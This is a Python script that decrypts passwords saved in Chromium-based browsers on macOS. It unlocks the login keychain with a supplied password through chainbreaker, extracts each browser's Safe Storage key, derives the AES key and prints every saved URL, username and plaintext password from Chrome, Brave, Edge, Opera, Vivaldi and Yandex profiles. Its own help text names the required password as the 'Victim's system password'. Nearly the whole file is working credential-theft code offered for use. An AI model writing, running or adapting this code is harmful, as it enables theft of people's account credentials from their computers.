
import os
import sys
import sqlite3
import argparse
import subprocess
import json
import uuid
import struct
import logging
import datetime

# Explicit imports to help PyInstaller find deps for dynamic modules
import binascii
import hashlib

# Check dependencies
try:
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except ImportError:
    print("[-] Missing 'cryptography' library. Install it: pip3 install cryptography")
    sys.exit(1)

def derive_key(safe_storage_pwd):
    # Chrome on Mac usage:
    # Key = PBKDF2(safe_storage_pwd, salt='saltysalt', iterations=1003, length=16)
    # Hashing: SHA1
    salt = b'saltysalt'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=16,
        salt=salt,
        iterations=1003,
        backend=default_backend()
    )
    return kdf.derive(safe_storage_pwd.encode('utf-8'))

def decrypt_password(encrypted_value, key):
    try:
        if not encrypted_value.startswith(b'v10'):
            return "Error:NotV10"
        
        data = encrypted_value[3:] # Strip 'v10'
        iv = b' ' * 16 # Fixed IV for Mac Chrome v10
        
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(data) + decryptor.finalize()
        
        # PKCS7 Unpadding
        # The last byte indicates the number of padding bytes
        padding_len = padded_data[-1]
        if padding_len < 1 or padding_len > 16:
             # Fallback if standard unpadding fails (sometimes it's just raw?)
             return padded_data.decode('utf-8', errors='ignore')
             
        decrypted = padded_data[:-padding_len]
        return decrypted.decode('utf-8')
        
    except Exception as e:
        return f"Error:{str(e)}"

def extract_safe_storage_key(keychain_path, password, service_name):
    print(f"[*] Extracting key from {keychain_path} using 'chainbreaker' (No UI)...")
    
    # Add chainbreaker from local repo to path
    if getattr(sys, 'frozen', False):
        # PyInstaller temp dir
        cb_repo = os.path.join(sys._MEIPASS, 'chainbreaker_repo')
    else:
        cb_repo = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'chainbreaker_repo')

    if cb_repo not in sys.path:
        sys.path.append(cb_repo)
        
    try:
        from chainbreaker import Chainbreaker
    except ImportError as e:
        print(f"[-] Chainbreaker import failed: {e}")
        # Fallback to security tool if import fails?
        # For now, let's fail loudly or revert to 'security' manually if needed.
        return None

    try:
        cb = Chainbreaker(keychain_path, unlock_password=password)
        
        # Check if unlocked
        if cb.locked and not cb.db_key:
             print("[-] Chainbreaker failed to unlock keychain (Wrong password?)")
             return None
             
        print("[*] Parsing keychain records...")
        # Dump generic passwords to find our replacement
        records = cb.dump_generic_passwords()
        
        for record in records:
            # Service name might be bytes or string, handle both
            svc = record.Service
            if isinstance(svc, bytes):
                svc = svc.decode('utf-8', errors='ignore')
                
            if svc == service_name:
                print(f"[+] Found '{service_name}' key via Chainbreaker!")
                return record.password
                
        print(f"[-] Key for service '{service_name}' not found in keychain.")
        return None

    except Exception as e:
        print(f"[-] Chainbreaker error: {e}")
        return None

# Browser base configs (service name is per-browser, not per-profile)
BROWSER_BASES = [
    {"name": "Google Chrome", "base": "Library/Application Support/Google/Chrome", "service": "Chrome Safe Storage"},
    {"name": "Brave", "base": "Library/Application Support/BraveSoftware/Brave-Browser", "service": "Brave Safe Storage"},
    {"name": "Vivaldi", "base": "Library/Application Support/Vivaldi", "service": "Vivaldi Safe Storage"},
    {"name": "Microsoft Edge", "base": "Library/Application Support/Microsoft Edge", "service": "Microsoft Edge Safe Storage"},
    {"name": "Yandex", "base": "Library/Application Support/Yandex/YandexBrowser", "service": "Yandex Safe Storage"},
    {"name": "Opera", "base": "Library/Application Support/com.operasoftware.Opera", "service": "Opera Safe Storage"},
]


def discover_browser_profiles(user_home):
    """Auto-discover all Chromium profiles with Login Data for each browser."""
    found = []
    for b in BROWSER_BASES:
        base_path = os.path.join(user_home, b["base"])
        if not os.path.isdir(base_path):
            continue
        # Scan for profile dirs: Default, Profile 1, Profile 2, ...
        for entry in sorted(os.listdir(base_path)):
            if entry == "Default" or entry.startswith("Profile "):
                login_data = os.path.join(base_path, entry, "Login Data")
                if os.path.exists(login_data):
                    found.append({
                        "name": b["name"],
                        "profile": entry,
                        "path": login_data,
                        "service": b["service"],
                    })
    return found

import shutil

def decrypt_db(db_path, keychain_path, password, service_name):
    print(f"\n[*] Processing: {db_path}")
    
    # 1. Get Key
    safe_storage_pwd = extract_safe_storage_key(keychain_path, password, service_name)
    if not safe_storage_pwd:
        return

    # 2. Derive AES Key
    try:
        aes_key = derive_key(safe_storage_pwd)
    except Exception as e:
        print(f"[-] Key derivation failed: {e}")
        return

    # 3. Connect to DB (Copy first to avoid lock)
    temp_db = db_path + ".temp"
    try:
        shutil.copy2(db_path, temp_db)
    except Exception as e:
        print(f"[-] Could not copy DB (Permission error?): {e}")
        # Try reading original as fallback
        temp_db = db_path
        
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    except Exception as e:
        print(f"[-] DB Error: {e}")
        if temp_db != db_path and os.path.exists(temp_db):
            os.remove(temp_db)
        return

    print("[+] Decrypted Logins:")
    count = 0
    for url, user, encrypted_password in cursor.fetchall():
        decrypted_password = decrypt_password(encrypted_password, aes_key)
        if decrypted_password.startswith("Error"):
             continue 
             
        print("-" * 60)
        print(f"URL: {url}")
        print(f"User: {user}")
        print(f"Pass: {decrypted_password}")
        count += 1
    
    conn.close()
    
    # Cleanup temp
    if temp_db != db_path and os.path.exists(temp_db):
        try:
            os.remove(temp_db)
        except:
            pass
            
    print(f"[*] Found {count} passwords.")

def main():
    parser = argparse.ArgumentParser(description="Decrypt Chrome Login Data (Mac)")
    parser.add_argument("--password", required=True, help="Victim's system password")
    
    # Mode 1: Auto-Scan
    parser.add_argument("--auto", action="store_true", help="Automatically find and decrypt all browsers on this Mac")
    
    # Mode 2: Manual
    parser.add_argument("--db", help="Path to 'Login Data' file")
    parser.add_argument("--keychain", help="Path to 'login.keychain-db'")
    parser.add_argument("--service", default="Chrome Safe Storage", help="Keychain Service Name")
    
    args = parser.parse_args()
    
    user_home = os.path.expanduser("~")
    
    if args.auto:
        print(f"[*] Starting Auto-Discovery on {os.uname().nodename}...")
        
        keychain_path = os.path.join(user_home, "Library/Keychains/login.keychain-db")
        if not os.path.exists(keychain_path):
            print(f"[-] Default keychain not found at {keychain_path}")
            sys.exit(1)
            
        print(f"[*] Keychain: {keychain_path}")
        
        # Password decryption — iterate all browsers × all profiles
        browser_profiles = discover_browser_profiles(user_home)
        for bp in browser_profiles:
            label = f"{bp['name']}" if bp['profile'] == 'Default' else f"{bp['name']} ({bp['profile']})"
            print(f"[*] Found Database: {label}")
            decrypt_db(bp['path'], keychain_path, args.password, bp['service'])
                
    else:
        # Manual Mode
        if not args.db or not args.keychain:
            print("[-] Error: --db and --keychain arguments are required for manual mode (or use --auto).")
            sys.exit(1)
            
        decrypt_db(args.db, args.keychain, args.password, args.service)

if __name__ == "__main__":
    main()
